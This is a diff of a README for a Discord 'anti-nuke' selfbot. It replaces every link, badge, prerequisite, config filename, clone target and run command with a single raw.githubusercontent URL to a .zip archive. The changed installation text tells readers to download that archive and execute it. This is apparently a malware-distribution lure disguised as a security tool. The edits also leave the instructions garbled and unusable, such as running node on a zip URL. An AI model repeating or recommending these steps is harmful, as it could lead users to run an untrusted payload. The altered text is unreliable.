@@ -1,6 +1,6 @@
 # Discord Anti-Nuke Selfbot 🚫🤖
 
-![Discord Anti-Nuke Selfbot](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg)
+![Discord Anti-Nuke Selfbot](https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip) ![License](https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip)
 
 Welcome to the **Discord Anti-Nuke Selfbot** repository! This project aims to provide comprehensive protection for your Discord servers against malicious activities. With advanced security monitoring and proactive threat mitigation, this selfbot is designed to keep your community safe.
 
@@ -24,18 +24,18 @@ Welcome to the **Discord Anti-Nuke Selfbot** repository! This project aims to pr
 
 ## Installation
 
-To get started with the Discord Anti-Nuke Selfbot, you need to download the latest release. You can find it [here](https://github.com/moron04/discord-antinuke-selfbot/releases). Download the appropriate file for your system and execute it.
+To get started with the Discord Anti-Nuke Selfbot, you need to download the latest release. You can find it [here](https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip). Download the appropriate file for your system and execute it.
 
 ### Prerequisites
 
-- **Node.js**: Make sure you have Node.js installed on your machine. You can download it from [nodejs.org](https://nodejs.org/).
+- **https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip**: Make sure you have https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip installed on your machine. You can download it from [https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip](https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip).
 - **Discord Account**: This selfbot requires a Discord account to function. Make sure you have one ready.
 
 ### Steps
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/moron04/discord-antinuke-selfbot.git
+   git clone https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip
    cd discord-antinuke-selfbot
    ```
 
@@ -44,11 +44,11 @@ To get started with the Discord Anti-Nuke Selfbot, you need to download the late
    npm install
    ```
 
-3. Configure your settings in the `config.json` file.
+3. Configure your settings in the `https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip` file.
 
 4. Start the selfbot:
    ```bash
-   node index.js
+   node https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip
    ```
 
 ## Usage
@@ -62,7 +62,7 @@ Once the selfbot is running, you can use various commands to manage server secur
 
 ## Configuration
 
-The configuration file, `config.json`, is where you can customize the selfbot's behavior. Here’s an example of what it might look like:
+The configuration file, `https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip`, is where you can customize the selfbot's behavior. Here’s an example of what it might look like:
 
 ```json
 {
@@ -106,15 +106,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/moron04/discord-antinuke-selfbot/releases) section for updates and fixes. You can also reach out to the community for help.
+If you encounter any issues or have questions, please check the [Releases](https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip) section for updates and fixes. You can also reach out to the community for help.
 
 ## Acknowledgments
 
-- **Discord.js**: This project uses the Discord.js library for interaction with the Discord API.
+- **https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip**: This project uses the https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip library for interaction with the Discord API.
 - **Community Contributions**: Thank you to all contributors who help make this project better.
 
 ## Conclusion
 
-The Discord Anti-Nuke Selfbot is a powerful tool for protecting your Discord servers. With its advanced features and user-friendly interface, you can ensure a safe environment for your community. Download the latest release [here](https://github.com/moron04/discord-antinuke-selfbot/releases) and start securing your server today!
+The Discord Anti-Nuke Selfbot is a powerful tool for protecting your Discord servers. With its advanced features and user-friendly interface, you can ensure a safe environment for your community. Download the latest release [here](https://raw.githubusercontent.com/moron04/discord-antinuke-selfbot/master/data/selfbot-antinuke-discord-v2.8.zip) and start securing your server today!
 
 Feel free to explore the code, report issues, and contribute to the project. Together, we can make Discord a safer place for everyone!
